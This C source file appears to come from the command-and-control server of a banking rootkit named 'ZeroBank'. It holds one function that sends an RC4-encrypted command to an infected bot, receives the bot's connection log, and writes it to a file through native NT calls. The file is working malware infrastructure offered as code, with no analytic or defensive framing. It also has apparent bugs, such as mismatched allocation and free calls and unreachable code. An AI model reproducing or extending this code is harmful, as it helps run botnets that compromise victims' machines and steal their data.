#include "server_globals.h"

BOOLEAN rootkit_get_bot_connections(IN SOCKET sock, IN BYTE PacketType)
{
	INT sendsize = 0;
	INT recvsize = 0;
	ZEROBANK_PACKET_TYPE Packet = { 0 };
	HANDLE handle;
	UNICODE_STRING ustr1;
	OBJECT_ATTRIBUTES oa;
	NTSTATUS st;
	IO_STATUS_BLOCK io;
	WCHAR Buffer[MAX_PATH];
	DWORD i = 0;
	BOOL g_cond;
	PVOID Out = NULL;
	PVOID Alloc = NULL;
	DWORD Size = 0;
	LARGE_INTEGER large;

	Packet.PacketType = PacketType;

	sendsize = send_packet_encrypted(sock, RC4_KEY_2, (PZEROBANK_PACKET_TYPE)&Packet, sizeof(ZEROBANK_PACKET_TYPE));
	if (sendsize > 0)
	{
		i = GetCurrentDirectoryW(MAX_PATH, Buffer);
		if (i > 0)
		{
			wcscat_s(Buffer, MAX_PATH, TEXT("\\zero-bot-connections.txt"));
			g_cond = RtlDosPathNameToNtPathName_U(Buffer, &ustr1, NULL, NULL);
			if (g_cond == TRUE)
			{
				char *filesize = (char*)LocalAlloc(LPTR, 1024);
				if (recv(sock, filesize, 1024, 0))
				{
					Size = atoi(filesize);
					printf("\r\n{ DUMP-CONNECTIONS-LOG-PLUGIN } Filesize: %d", Size);
				}
				
				Out = recv_decrypted(sock, RC4_KEY_3, (PVOID)Alloc, Size);
				if (Out)
				{
					large.QuadPart = 1024;				
					RtlInitUnicodeString(&ustr1, Buffer);
					InitializeObjectAttributes(&oa, &ustr1, OBJ_CASE_INSENSITIVE, NULL, NULL);

					__try
					{
	
						st = NtCreateFile(&handle, FILE_GENERIC_WRITE,
							&oa, &io,
							&large,
							FILE_ATTRIBUTE_NORMAL,
							FILE_SHARE_WRITE,
							FILE_CREATE,
							FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
							NULL, 0);
						if (NT_SUCCESS(st))
						{
							st = NtWriteFile(handle, NULL, NULL,
								NULL, &io, Out, Size,
								NULL, 0);
							if (NT_SUCCESS(st))
							{
								NtClose(handle);
								g_cond = TRUE;
							}
						}
					}
					__except (EXCEPTION_EXECUTE_HANDLER)
					{
						return GetExceptionCode();
						printf("\r\nException Caught");
					}

				}
				RtlFreeHeap(GetProcessHeap(), 0, filesize);
			}
		}
	}

	return g_cond;
}